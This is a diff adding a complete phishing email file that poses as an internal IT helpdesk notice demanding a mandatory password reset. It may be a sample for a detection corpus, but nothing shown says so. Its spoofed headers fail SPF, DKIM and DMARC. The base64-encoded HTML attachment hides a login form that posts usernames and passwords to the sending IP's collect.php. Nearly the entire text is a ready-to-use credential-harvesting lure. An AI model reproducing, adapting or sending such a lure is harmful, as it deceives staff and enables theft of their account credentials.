@@ -1,0 +1,29 @@
+Return-Path: <helpdesk@corp.example>
+Received: from relay.unknown.example (unknown [203.0.113.66])
+	by mx1.corp.example with ESMTP id 2JkL4; Fri, 6 Nov 2026 10:05:40 +0000
+Authentication-Results: mx1.corp.example;
+	spf=fail smtp.mailfrom=corp.example;
+	dkim=fail header.d=corp.example;
+	dmarc=fail header.from=corp.example
+From: IT Helpdesk <helpdesk@corp.example>
+To: All Staff <all-staff@corp.example>
+Subject: Mandatory password reset - open the attached form
+Date: Fri, 6 Nov 2026 10:05:37 +0000
+Message-ID: <reset-77@relay.unknown.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b4"
+
+--b4
+Content-Type: text/plain; charset="utf-8"
+
+Dear user,
+Due to a security update, all staff must reset their password immediately.
+Open the attached form and sign in with your current password to confirm.
+IT Helpdesk
+--b4
+Content-Type: text/html; name="Password_Reset_Form.html"
+Content-Disposition: attachment; filename="Password_Reset_Form.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwOi8vMjAzLjAuMTEzLjY2L2NvbGxlY3QucGhwIiBtZXRob2Q9InBvc3QiPjxpbnB1dCBuYW1lPSJ1Ij48aW5wdXQgbmFtZT0icCIgdHlwZT0icGFzc3dvcmQiPjwvZm9ybT48L2JvZHk+PC9odG1sPgo=
+--b4--
